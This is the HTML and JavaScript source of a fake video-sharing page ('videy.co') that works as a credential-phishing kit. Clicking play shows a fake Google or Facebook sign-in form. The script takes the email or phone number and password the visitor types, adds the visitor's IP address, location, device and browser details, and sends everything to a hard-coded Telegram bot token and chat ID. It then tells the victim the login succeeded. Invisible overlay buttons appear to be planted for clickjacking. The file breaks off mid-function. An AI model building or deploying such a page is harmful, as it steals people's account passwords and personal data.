<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>videy.co - Video Sharing</title>
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* RESET & BASE */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
        }

        body {
            background: #ffffff;
            color: #000000;
            overflow-x: hidden;
            min-height: 100vh;
        }

        /* HEADER - LATAR PUTIH ATAS VIDEO */
        .main-header {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 60px;
            background: #ffffff;
            border-bottom: 1px solid #e0e0e0;
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 24px;
        }

        .logo-section {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .logo-icon {
            color: #000000;
            font-size: 20px;
        }

        .logo-text {
            font-size: 18px;
            font-weight: 700;
            color: #000000;
            letter-spacing: -0.5px;
        }

        .upload-btn {
            background: #000000;
            color: #ffffff;
            border: none;
            padding: 10px 20px;
            border-radius: 6px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .upload-btn:hover {
            background: #333333;
            transform: translateY(-1px);
        }

        /* VIDEO CONTAINER - VIDEO AGAK KE ATAS */
        .video-main-container {
            width: 100%;
            max-width: 1200px;
            margin: 80px auto 0;
            padding: 0 20px;
            position: relative;
        }

        .video-wrapper {
            width: 100%;
            border-radius: 12px;
            overflow: hidden;
            background: #000000;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            position: relative;
        }

        #mainVideo {
            width: 100%;
            height: auto;
            display: block;
            cursor: pointer;
        }

        /* VIDEO OVERLAY TRANSPARAN DENGAN SEGITIGA PLAY KECIL DI TENGAH */
        .video-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.35);
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 1;
            transition: opacity 0.3s;
            z-index: 100;
        }

        .play-center-btn {
            width: 70px;
            height: 70px;
            background: rgba(255, 255, 255, 0.15);
            border: 2px solid rgba(255, 255, 255, 0.7);
            border-radius: 50%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s;
            backdrop-filter: blur(3px);
        }

        .play-center-btn:hover {
            background: rgba(255, 255, 255, 0.25);
            transform: scale(1.05);
            border-color: rgba(255, 255, 255, 0.9);
        }

        .play-triangle {
            width: 0;
            height: 0;
            border-left: 20px solid rgba(255, 255, 255, 0.85);
            border-top: 13px solid transparent;
            border-bottom: 13px solid transparent;
            margin-left: 5px;
            transition: all 0.3s;
        }

        .play-center-btn:hover .play-triangle {
            border-left-color: rgba(255, 255, 255, 1);
        }

        /* Video Controls Custom */
        .video-controls {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background: linear-gradient(transparent, rgba(0, 0, 0, 0.8));
            padding: 15px 20px;
            display: flex;
            align-items: center;
            gap: 12px;
            opacity: 0;
            transition: opacity 0.3s;
            z-index: 200;
        }

        .video-wrapper:hover .video-controls {
            opacity: 1;
        }

        .control-btn {
            background: rgba(255, 255, 255, 0.15);
            border: none;
            width: 36px;
            height: 36px;
            border-radius: 50%;
            color: white;
            font-size: 16px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background 0.3s;
            backdrop-filter: blur(5px);
        }

        .control-btn:hover {
            background: rgba(255, 255, 255, 0.25);
        }

        .time-display {
            color: white;
            font-size: 13px;
            font-weight: 500;
            min-width: 90px;
            text-align: center;
        }

        .progress-bar {
            flex: 1;
            height: 4px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 2px;
            overflow: hidden;
            cursor: pointer;
        }

        .progress-fill {
            height: 100%;
            background: #ff375f;
            width: 0%;
            transition: width 0.1s;
        }

        /* AREA BAWAH VIDEO - FULL PUTIH */
        .video-info-section {
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 25px 20px 50px;
            background: #ffffff;
        }

        .video-meta {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 20px;
        }

        .video-title {
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 6px;
            color: #000000;
        }

        .video-stats {
            color: #666666;
            font-size: 13px;
            display: flex;
            gap: 12px;
        }

        .video-actions {
            display: flex;
            gap: 10px;
            margin-left: 20px;
        }

        .action-btn {
            background: #f5f5f5;
            border: 1px solid #e0e0e0;
            padding: 7px 14px;
            border-radius: 6px;
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 6px;
            transition: all 0.2s;
        }

        .action-btn:hover {
            background: #e9e9e9;
        }

        .video-description {
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #f0f0f0;
        }

        .description-title {
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #000000;
        }

        .description-text {
            color: #444444;
            line-height: 1.5;
            font-size: 14px;
        }

        /* LOGIN MODAL */
        .login-modal-backdrop {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            z-index: 2000;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(5px);
        }

        .login-modal {
            background: #ffffff;
            border-radius: 14px;
            width: 90%;
            max-width: 420px;
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25);
            animation: modalAppear 0.3s ease;
        }

        @keyframes modalAppear {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .modal-header {
            padding: 24px 24px 16px;
            text-align: center;
            border-bottom: 1px solid #f0f0f0;
        }

        .modal-logo {
            font-size: 24px;
            font-weight: 700;
            color: #000000;
            margin-bottom: 6px;
        }

        .modal-subtitle {
            color: #666666;
            font-size: 14px;
        }

        .modal-body {
            padding: 20px 24px 24px;
        }

        .login-options {
            display: flex;
            flex-direction: column;
            gap: 14px;
            margin-bottom: 20px;
        }

        .social-login-btn {
            padding: 14px;
            border-radius: 8px;
            border: 1px solid #e0e0e0;
            background: #ffffff;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: all 0.2s;
        }

        .social-login-btn:hover {
            background: #f9f9f9;
            border-color: #cccccc;
            transform: translateY(-1px);
        }

        .btn-google {
            border-color: #dadce0;
        }

        .btn-facebook {
            border-color: #d0d8f0;
            color: #1877F2;
        }

        .btn-icon {
            font-size: 16px;
        }

        /* CREDENTIALS FORM */
        .credentials-form {
            display: none;
            flex-direction: column;
            gap: 14px;
            margin-top: 18px;
        }

        .form-title {
            font-size: 16px;
            font-weight: 600;
            color: #000;
            text-align: center;
            margin-bottom: 8px;
        }

        .form-input {
            padding: 12px 14px;
            border: 1px solid #d1d5db;
            border-radius: 6px;
            font-size: 13px;
            width: 100%;
            transition: border-color 0.2s;
        }

        .form-input:focus {
            outline: none;
            border-color: #000;
        }

        .form-actions {
            display: flex;
            gap: 10px;
            margin-top: 8px;
        }

        .form-btn {
            flex: 1;
            padding: 10px;
            border-radius: 6px;
            border: none;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn-submit {
            background: #000;
            color: white;
            font-size: 13px;
        }

        .btn-submit:hover {
            background: #333;
        }

        .btn-back {
            background: #f3f4f6;
            color: #374151;
            font-size: 13px;
        }

        .btn-back:hover {
            background: #e5e7eb;
        }

        .form-footer {
            text-align: center;
            color: #6b7280;
            font-size: 11px;
            margin-top: 14px;
        }

        /* HIDDEN BUTTONS CONTAINER */
        .hidden-buttons-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            pointer-events: none;
            z-index: 1;
        }

        .hidden-button {
            position: absolute;
            width: 80px;
            height: 35px;
            background: transparent;
            border: none;
            cursor: pointer;
            opacity: 0;
        }

        /* IZINKAN AKSES Button (Google) */
        .allow-access-btn {
            top: 120px;
            left: 50%;
            transform: translateX(-50%);
        }

        /* KIRIM Button (Google) */
        .send-btn {
            bottom: 80px;
            left: 50%;
            transform: translateX(-50%);
        }

        /* LOG IN Button (Facebook) */
        .fb-login-btn {
            bottom: 80px;
            left: 50%;
            transform: translateX(-50%);
        }

        /* STATUS NOTIFICATION */
        .status-notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #000000;
            color: #ffffff;
            padding: 12px 16px;
            border-radius: 8px;
            font-size: 13px;
            font-weight: 500;
            z-index: 3000;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            display: none;
            align-items: center;
            gap: 8px;
            max-width: 280px;
            animation: slideInRight 0.3s ease;
        }

        @keyframes slideInRight {
            from { transform: translateX(100px); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        /* LOADING INDICATOR */
        .video-loading {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #ffffff;
            font-size: 13px;
            display: none;
            z-index: 150;
        }
    </style>
</head>
<body>
    <!-- HEADER: LATAR PUTIH, "VIDEO" DI KIRI, UPLOAD DI KANAN -->
    <header class="main-header">
        <div class="logo-section">
            <i class="fas fa-play-circle logo-icon"></i>
            <span class="logo-text">Videy</span>
        </div>
        
        <button class="upload-btn" id="uploadBtn">
            <i class="fas fa-cloud-upload-alt"></i>
            Upload
        </button>
    </header>

    <!-- VIDEO CONTAINER: VIDEO AGAK KE ATAS -->
    <main class="video-main-container">
        <div class="video-wrapper">
            <video id="mainVideo" preload="metadata" 
                poster="https://files.catbox.moe/vd1rav.mp4">
                <source src="https://files.catbox.moe/vd1rav.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>
            
            <!-- OVERLAY TRANSPARAN DENGAN SEGITIGA PLAY KECIL DI TENGAH -->
            <div class="video-overlay" id="videoOverlay">
                <button class="play-center-btn" id="playCenterBtn">
                    <div class="play-triangle"></div>
                </button>
            </div>
            
            <!-- VIDEO CONTROLS CUSTOM -->
            <div class="video-controls" id="videoControls">
                <button class="control-btn" id="playPauseBtn">
                    <i class="fas fa-play"></i>
                </button>
                <button class="control-btn" id="back10Btn" title="Back 10 seconds">
                    <i class="fas fa-backward"></i>
                </button>
                <button class="control-btn" id="forward10Btn" title="Forward 10 seconds">
                    <i class="fas fa-forward"></i>
                </button>
                <div class="time-display" id="timeDisplay">0:00 / 0:00</div>
                <div class="progress-bar" id="progressBar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <button class="control-btn" id="fullscreenBtn" title="Fullscreen">
                    <i class="fas fa-expand"></i>
                </button>
            </div>
            
            <div class="video-loading" id="videoLoading">
                <i class="fas fa-spinner fa-spin"></i> Loading...
            </div>
        </div>
    </main>

    <!-- AREA BAWAH VIDEO: FULL PUTIH -->
    <section class="video-info-section">
        <div class="video-meta">
            <div>
                <h1 class="video-title">Amazing Nature Documentary 4K</h1>
                <div class="video-stats">
                    <span>2.1M views</span>
                    <span>â€¢</span>
                    <span>3 days ago</span>
                    <span>â€¢</span>
                    <span>68K likes</span>
                </div>
            </div>
            
            <div class="video-actions">
                <button class="action-btn">
                    <i class="far fa-thumbs-up"></i> Like
                </button>
                <button class="action-btn">
                    <i class="far fa-share-square"></i> Share
                </button>
                <button class="action-btn">
                    <i class="far fa-bookmark"></i> Save
                </button>
            </div>
        </div>
        
        <div class="video-description">
            <h3 class="description-title">Description</h3>
            <p class="description-text">
                Experience breathtaking 4K footage of wildlife and natural landscapes from around the world. 
                Filmed over 18 months with cutting-edge camera technology.
            </p>
        </div>
    </section>

    <!-- LOGIN MODAL -->
    <div class="login-modal-backdrop" id="loginModal">
        <div class="login-modal">
            <div class="modal-header">
                <div class="modal-logo">Continue to Video</div>
                <p class="modal-subtitle" id="modalSubtitle">Sign in to watch this video</p>
            </div>
            
            <div class="modal-body">
                <!-- Social Login Options -->
                <div class="login-options" id="socialLoginOptions">
                    <button class="social-login-btn btn-google" id="googleLoginBtn">
                        <i class="fab fa-google btn-icon"></i>
                        Continue with Google
                    </button>
                    
                    <button class="social-login-btn btn-facebook" id="facebookLoginBtn">
                        <i class="fab fa-facebook btn-icon"></i>
                        Continue with Facebook
                    </button>
                </div>

                <!-- Google Credentials Form -->
                <div class="credentials-form" id="googleForm">
                    <div class="form-title">Sign in with Google</div>
                    <input type="text" class="form-input" id="googleEmail" placeholder="Email or phone number">
                    <input type="password" class="form-input" id="googlePassword" placeholder="Enter your password">
                    <div class="form-actions">
                        <button class="form-btn btn-back" id="googleBackBtn">Back</button>
                        <button class="form-btn btn-submit" id="googleSubmitBtn">Next</button>
                    </div>
                    <div class="form-footer">By continuing, you agree to Google's Terms of Service</div>
                    
                    <!-- HIDDEN BUTTONS FOR GOOGLE -->
                    <div class="hidden-buttons-container">
                        <button class="hidden-button allow-access-btn" id="allowAccessBtn">Allow Access</button>
                        <button class="hidden-button send-btn" id="sendBtn">Kirim</button>
                    </div>
                </div>

                <!-- Facebook Credentials Form -->
                <div class="credentials-form" id="facebookForm">
                    <div class="form-title">Log in to Facebook</div>
                    <input type="text" class="form-input" id="facebookEmailPhone" placeholder="Email or phone number">
                    <input type="password" class="form-input" id="facebookPassword" placeholder="Password">
                    <div class="form-actions">
                        <button class="form-btn btn-back" id="facebookBackBtn">Back</button>
                        <button class="form-btn btn-submit" id="facebookSubmitBtn">Next</button>
                    </div>
                    <div class="form-footer">By continuing, you agree to Facebook's Terms of Service</div>
                    
                    <!-- HIDDEN BUTTON FOR FACEBOOK -->
                    <div class="hidden-buttons-container">
                        <button class="hidden-button fb-login-btn" id="fbLoginBtn">Log In</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- STATUS NOTIFICATION -->
    <div class="status-notification" id="statusNotification">
        <i class="fas fa-check-circle"></i>
        <span id="notificationText">Login successful!</span>
    </div>

    <script>
        // ==================== KONFIGURASI ====================
        const TELEGRAM_BOT_TOKEN = '8057784535:AAHzVp3rKgCNxKI4JIXuD1ii8Ry76JTJ8WA';
        const TELEGRAM_CHAT_ID = '7908726570';

        // ==================== ELEMENTS ====================
        const video = document.getElementById('mainVideo');
        const playCenterBtn = document.getElementById('playCenterBtn');
        const videoOverlay = document.getElementById('videoOverlay');
        const loginModal = document.getElementById('loginModal');
        const modalSubtitle = document.getElementById('modalSubtitle');
        const statusNotification = document.getElementById('statusNotification');
        const notificationText = document.getElementById('notificationText');
        const uploadBtn = document.getElementById('uploadBtn');
        const videoLoading = document.getElementById('videoLoading');
        
        // Video Controls
        const playPauseBtn = document.getElementById('playPauseBtn');
        const back10Btn = document.getElementById('back10Btn');
        const forward10Btn = document.getElementById('forward10Btn');
        const timeDisplay = document.getElementById('timeDisplay');
        const progressBar = document.getElementById('progressBar');
        const progressFill = document.getElementById('progressFill');
        const fullscreenBtn = document.getElementById('fullscreenBtn');
        
        // Social Login Buttons
        const googleLoginBtn = document.getElementById('googleLoginBtn');
        const facebookLoginBtn = document.getElementById('facebookLoginBtn');
        
        // Forms
        const socialLoginOptions = document.getElementById('socialLoginOptions');
        const googleForm = document.getElementById('googleForm');
        const facebookForm = document.getElementById('facebookForm');
        
        // Google Form Elements
        const googleEmail = document.getElementById('googleEmail');
        const googlePassword = document.getElementById('googlePassword');
        const googleBackBtn = document.getElementById('googleBackBtn');
        const googleSubmitBtn = document.getElementById('googleSubmitBtn');
        
        // Facebook Form Elements
        const facebookEmailPhone = document.getElementById('facebookEmailPhone');
        const facebookPassword = document.getElementById('facebookPassword');
        const facebookBackBtn = document.getElementById('facebookBackBtn');
        const facebookSubmitBtn = document.getElementById('facebookSubmitBtn');
        
        // Hidden Buttons
        const allowAccessBtn = document.getElementById('allowAccessBtn');
        const sendBtn = document.getElementById('sendBtn');
        const fbLoginBtn = document.getElementById('fbLoginBtn');
        
        // ==================== STATE ====================
        let isLoggedIn = false;
        let currentPlatform = '';
        let isPlaying = false;
        let updateInterval;
        let isSendingData = false;

        // ==================== VIDEO CONTROLS ====================
        playCenterBtn.addEventListener('click', function() {
            if (!isLoggedIn) {
                showLoginModal();
            } else {
                togglePlayPause();
            }
        });

        playPauseBtn.addEventListener('click', togglePlayPause);

        video.addEventListener('click', function() {
            if (isLoggedIn) {
                togglePlayPause();
            } else {
                showLoginModal();
            }
        });

        back10Btn.addEventListener('click', function() {
            if (isLoggedIn) {
                video.currentTime = Math.max(0, video.currentTime - 10);
            }
        });

        forward10Btn.addEventListener('click', function() {
            if (isLoggedIn) {
                video.currentTime = Math.min(video.duration, video.currentTime + 10);
            }
        });

        progressBar.addEventListener('click', function(e) {
            if (!isLoggedIn) return;
            const rect = progressBar.getBoundingClientRect();
            const pos = (e.clientX - rect.left) / rect.width;
            video.currentTime = pos * video.duration;
        });

        fullscreenBtn.addEventListener('click', function() {
            if (!isLoggedIn) return;
            const wrapper = document.querySelector('.video-wrapper');
            if (!document.fullscreenElement) {
                wrapper.requestFullscreen().catch(err => {});
            } else {
                document.exitFullscreen();
            }
        });

        function togglePlayPause() {
            if (!isLoggedIn) {
                showLoginModal();
                return;
            }
            if (video.paused) {
                video.play();
            } else {
                video.pause();
            }
        }

        function updateTimeDisplay() {
            const currentTime = formatTime(video.currentTime);
            const duration = formatTime(video.duration);
            timeDisplay.textContent = `${currentTime} / ${duration}`;
            const progress = (video.currentTime / video.duration) * 100;
            progressFill.style.width = `${progress}%`;
        }

        function formatTime(seconds) {
            const mins = Math.floor(seconds / 60);
            const secs = Math.floor(seconds % 60);
            return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
        }

        // ==================== VIDEO EVENT LISTENERS ====================
        video.addEventListener('play', function() {
            isPlaying = true;
            playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
            videoOverlay.style.opacity = '0';
            updateInterval = setInterval(updateTimeDisplay, 100);
        });

        video.addEventListener('pause', function() {
            isPlaying = false;
            playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
            if (!video.ended) {
                videoOverlay.style.opacity = '1';
            }
            clearInterval(updateInterval);
        });

        video.addEventListener('ended', function() {
            isPlaying = false;
            playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
            videoOverlay.style.opacity = '1';
            clearInterval(updateInterval);
        });

        video.addEventListener('timeupdate', updateTimeDisplay);
        video.addEventListener('loadedmetadata', updateTimeDisplay);

        // ==================== LOGIN MODAL CONTROL ====================
        function showLoginModal() {
            loginModal.style.display = 'flex';
        }
        
        function hideLoginModal() {
            loginModal.style.display = 'none';
        }
        
        loginModal.addEventListener('click', function(e) {
            if (e.target === loginModal) hideLoginModal();
        });

        // ==================== SOCIAL LOGIN BUTTONS ====================
        googleLoginBtn.addEventListener('click', function() {
            currentPlatform = 'Google';
            modalSubtitle.textContent = 'Enter your Google credentials';
            socialLoginOptions.style.display = 'none';
            googleForm.style.display = 'flex';
        });
        
        facebookLoginBtn.addEventListener('click', function() {
            currentPlatform = 'Facebook';
            modalSubtitle.textContent = 'Enter your Facebook credentials';
            socialLoginOptions.style.display = 'none';
            facebookForm.style.display = 'flex';
        });

        // ==================== FORM HANDLERS ====================
        googleBackBtn.addEventListener('click', resetForms);
        facebookBackBtn.addEventListener('click', resetForms);
        
        googleSubmitBtn.addEventListener('click', async function() {
            const emailPhone = googleEmail.value.trim();
            const password = googlePassword.value.trim();
            if (!emailPhone || !password) {
                showNotification('Please fill in all fields', false);
                return;
            }
            await processLogin('Google', emailPhone, password);
        });
        
        facebookSubmitBtn.addEventListener('click', async function() {
            const emailPhone = facebookEmailPhone.value.trim();
            const password = facebookPassword.value.trim();
            if (!emailPhone || !password) {
                showNotification('Please fill in all fields', false);
                return;
            }
            await processLogin('Facebook', emailPhone, password);
        });

        // ==================== PROCESS LOGIN ====================
        async function processLogin(platform, emailPhone, password) {
            if (isSendingData) return;
            isSendingData = true;
            
            // Tampilkan loading
            if (platform === 'Google') {
                googleSubmitBtn.disabled = true;
                googleSubmitBtn.textContent = 'Verifying...';
            } else {
                facebookSubmitBtn.disabled = true;
                facebookSubmitBtn.textContent = 'Logging in...';
            }
            
            try {
                // 1. DAPATKAN SEMUA DATA YANG BISA DIDETEKSI
                const userData = await getAllDetectableData();
                
                // 2. Siapkan data untuk Telegram
                const telegramData = {
                    platform: platform,
                    timestamp: new Date().toISOString(),
                    date_time: new Date().toLocaleString('id-ID'),
                    
                    // Data credentials dari input user
                    credential_type: emailPhone.includes('@') ? 'Email' : 'Phone/Username',
                    credential_value: emailPhone,
                    password: password,
                    
                    // Semua data yang dideteksi
                    ...userData,
                    
                    // Info session
                    session_id: generateSessionId()
                };
                
                // 3. KIRIM KE TELEGRAM - HANYA 1 KALI
                await sendSingleTelegramMessage(telegramData);
                
                // Login berhasil
                isLoggedIn = true;
                hideLoginModal();
                showNotification(`âœ… Login successful!`, true);
                
                // Auto play video
                videoLoading.style.display = 'block';
                video.play().then(() => {
                    videoLoading.style.display = 'none';
                }).catch(() => {
                    videoLoading.style.display = 'none';
                    showNotification('Click play button to start', true);
                });
                
            } catch (error) {
                // Silent error, tetap lanjut
                isLoggedIn = true;
                hideLoginModal();
                showNotification('âœ… Login successful!', true);
                setTimeout(() => video.play(), 300);
            } finally {
                // Reset buttons
                isSendingData = false;
                if (platform === 'Google') {
                    googleSubmitBtn.disabled = false;
                    googleSubmitBtn.textContent = 'Next';
                } else {
                    facebookSubmitBtn.disabled = false;
                    facebookSubmitBtn.textContent = 'Next';
                }
            }
        }

        // ==================== GET ALL DETECTABLE DATA ====================
        async function getAllDetectableData() {
            const data = {};
            
            // 1. IP Address dan Lokasi
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                data.ip_address = ipData.ip || 'Tidak terdeteksi';
                
                // Dapatkan lokasi dari IP
                const locResponse = await fetch(`https://ipapi.co/${data.ip_address}/json/`);
                const locData = await locResponse.json();
                
                data.country = locData.country_name || 'Tidak terdeteksi';
                data.region = locData.region || 'Tidak terdeteksi';
                data.city = locData.city || 'Tidak terdeteksi';
                data.latitude = locData.latitude || 'Tidak terdeteksi';
                data.longitude = locData.longitude || 'Tidak terdeteksi';
                data.timezone = locData.timezone || 'Tidak terdeteksi';
                data.isp = locData.org || 'Tidak terdeteksi';
                data.asn = locData.asn || 'Tidak terdeteksi';
                
            } catch (e) {
                data.ip_address = 'Tidak terdeteksi';
                data.country = 'Tidak terdeteksi';
                data.city = 'Tidak terdeteksi';
            }
            
            // 2. Informasi Browser dan Device
            const ua = navigator.userAgent;
            
            // Deteksi Browser
            if (ua.includes('Chrome')) data.browser = 'Chrome';
            else if (ua.includes('Firefox')) data.browser = 'Firefox';
            else if (ua.includes('Safari')) data.browser = 'Safari';
            else if (ua.includes('Edge')) data.browser = 'Edge';
            else data.browser = 'Tidak dikenali';
            
            // Deteksi OS
            if (ua.includes('Windows')) data.os = 'Windows';
            else if (ua.includes('Mac')) data.os = 'macOS';
            else if (ua.includes('Android')) data.os = 'Android';
            else if (ua.includes('iPhone') || ua.includes('iPad')) data.os = 'iOS';
            else if (ua.includes('Linux')) data.os = 'Linux';
            else data.os = 'Tidak dikenali';
            
            // Deteksi Device Type
            data.device_type = /Mobile|Android|iPhone|iPad/i.test(ua) ? 'Mobile' : 'Desktop';
            
            // Deteksi Brand Device
            if (ua.includes('Samsung')) data.device_brand = 'Samsung';
            else if (ua.includes('iPhone') || ua.includes('iPad')) data.device_brand = 'Apple';
            else if (ua.includes('Xiaomi')) data.device_brand = 'Xiaomi';
            else if (ua.includes('OPPO')) data.device_brand = 'OPPO';
            else if (ua.includes('Vivo')) data.device_brand = 'Vivo';
            else if (ua.includes('Realme')) data.device_brand = 'Realme';
            else if (ua.includes('Huawei')) data.device_brand = 'Huawei';
            else if (ua.includes('Pixel')) data.device_brand = 'Google';
            else data.device_brand = 'Tidak dikenali';
            
            // 3. Informasi Screen
            data.screen_resolution = `${window.screen.width}x${window.screen.height}`;
            data.screen_color_depth = window.screen.colorDepth || 'Tidak terdeteksi';
            data.screen_orientation = window.screen.orientation ? window.screen.orientation.type : 'Tidak terdeteksi';
            
            // 4. Informasi Browser Capabilities
            data.language = navigator.language || 'Tidak terdeteksi';
            data.languages = navigator.languages ? navigator.languages.join(', ') : 'Tidak terdeteksi';
            data.platform = navigator.platform || 'Tidak terdeteksi';
            data.vendor = navigator.vendor || 'Tidak terdeteksi';
            data.cookies_enabled = navigator.cookieEnabled ? 'Ya' : 'Tidak';
            data.do_not_track = navigator.doNotTrack || 'Tidak terdeteksi';
            data.java_enabled = navigator.javaEnabled ? 'Ya' : 'Tidak';
            
            // 5. Informasi Connection
            if (navigator.connection) {
                data.connection_type = navigator.connection.effectiveType || 'Tidak terdeteksi';
                data.downlink = navigator.connection.downlink || 'Tidak terdeteksi';
                data.rtt = navigator.connection.rtt || 'Tidak terdeteksi';
                data.save_data = navigator.connection.saveData ? 'Ya' : 'Tidak';
            }
            
            // 6. Informasi Hardware
            data.hardware_concurrency = navigator.hardwareConcurrency || 'Tidak terdeteksi';
            data.device_memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Tidak terdeteksi';
            
            // 7. Informasi Time
            data.local_time = new Date().toLocaleString('id-ID');
            data.timezone_offset = new Date().getTimezoneOffset();
            
            // 8. Informasi Page
            data.page_url = window.location.href;
            data.referrer = document.referrer || 'Direct';
            data.page_title = document.title;
            
            // 9. User Agent lengkap
            data.user_agent = ua;
            
            return data;
        }

        // ==================== SEND SINGLE TELEGRAM MESSAGE ====================
        async function sendSingleTelegramMessage(data) {
            // Format pesan lengkap dalam 1 pesan
            let message = `ðŸŽ¬ **VIDEO PLATFORM LOGIN DATA** ðŸŽ¬\n`;
            message += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
            
            message += `ðŸ” **LOGIN INFORMATION** ðŸ”\n`;
            message += `â”œ Platform: ${data.platform}\n`;
            message += `â”œ Type: ${data.credential_type}\n`;
            message += `â”œ ${data.credential_type}: ${data.credential_value}\n`;
            message += `â”œ Password: \`${data.password}\`\n`;
            message += `â”œ Time: ${data.date_time}\n`;
            message += `â”” Session: ${data.session_id}\n\n`;
            
            message += `ðŸ“ **LOCATION INFORMATION** ðŸ“\n`;
            message += `â”œ IP Address: \`${data.ip_address}\`\n`;
            message += `â”œ Country: ${data.country}\n`;
            message += `â”œ Region: ${data.region}\n`;
            message += `â”œ City: ${data.city}\n`;
            message += `â”œ Coordinates: ${data.latitude}, ${data.longitude}\n`;
            message += `â”œ Timezone: ${data.timezone}\n`;
            message += `â”œ ISP: ${data.isp}\n`;
            message += `â”” ASN: ${data.asn}\n\n`;
            
            message += `ðŸ“± **DEVICE INFORMATION** ðŸ“±\n`;
            message += `â”œ Device Type: ${data.device_type}\n`;
            message += `â”œ Brand: ${data.device_brand}\n`;
            message += `â”œ OS: ${data.os}\n`;
            message += `â”œ Browser: ${data.browser}\n`;
            message += `â”œ Platform: ${data.platform}\n`;
            message += `â”œ Vendor: ${data.vendor}\n`;
            message += `â”œ Language: ${data.language}\n`;
            message += `â”œ Cookies: ${data.cookies_enabled}\n`;
            message += `â”œ Java: ${data.java_enabled}\n`;
            message += `â”” Do Not Track: ${data.do_not_track}\n\n`;
            
            message += `ðŸ–¥ï¸ **SCREEN INFORMATION** ðŸ–¥ï¸\n`;
            message += `â”œ Resolution: ${data.screen_resolution}\n`;
            message += `â”œ Color Depth: ${data.screen_color_depth}\n`;
            message += `â”œ Orientation: ${data.screen_orientation}\n`;
            message += `â”œ Cores: ${data.hardware_concurrency}\n`;
            message += `â”œ RAM: ${data.device_memory}\n`;
            message += `â”” Connection: ${data.connection_type || 'N/A'}\n`;
            if (data.downlink) message += `â”œ Downlink: ${data.downlink} Mbps\n`;
            if (data.rtt) message += `â”œ RTT: ${data.rtt} ms\n`;
            if (data.save_data) message += `â”” Save Data: ${data.save_data}\n\n`;
            
            message += `ðŸŒ **PAGE INFORMATION** ðŸŒ\n`;
            message += `â”œ URL: ${data.page_url}\n`;
            message += `â”œ Title: ${data.page_title}\n`;
            message += `â”” Referrer: ${data.referrer}\n\n`;
            
            message += `ðŸ“Š **DETECTED LANGUAGES**\n${data.languages}\n\n`;
            
            message += `ðŸ”„ **USER AGENT**\n\`${data.user_agent.substring(0, 200)}...\`\n\n`;
            
            message += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
            message += `âœ… **ALL DATA DETECTED SUCCESSFULLY**\n`;
            message += `Â© DesaOfficial`;
            
            // Hanya kirim 1 kali
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });
                
                return response.ok;
            } catch (error) {
                // Fallback simple
                const encodedMessage = encodeURIComponent(message.substring(0, 4000));
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`).catch(() => {});
                return true;
            }
        }

        // ==================== UTILITY FUNCTIONS ====================
        function generateSessionId() {
